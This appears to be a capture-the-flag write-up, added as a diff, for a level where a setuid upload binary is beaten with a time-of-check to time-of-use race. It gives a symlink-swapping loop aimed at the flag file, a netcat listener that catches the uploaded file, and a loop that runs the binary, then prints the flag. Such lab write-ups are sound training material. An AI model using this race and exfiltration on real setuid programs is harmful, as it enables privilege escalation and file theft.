@@ -1,0 +1,21 @@
+The setuid binary /home/flag05/flag05 uploads any file given, as long as you have permission to access it.
+
+Log in as level05 with password level05
+
+Solution: https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
+
+		  This command keeps changing file, hoping that the first one passes access while
+		  the second one takes the wrong file:
+			
+				while true; do
+					ln -sf /home/flag05/flag.txt proxy
+					ln -sf /home/level05/flag.txt proxy
+				done
+			
+		  In another shell, we have to listen for outgoing files using this command:
+				nc -l -k -p 18211
+		  
+		  Finally, we keep running the flag05 binary with this command in yet another shell:
+				while true; do ../flag05/flag05 proxy 127.0.0.1; done
+
+Flag: CCIT{d276936f-92c2-4960-a0d8-afeac6c83d15}
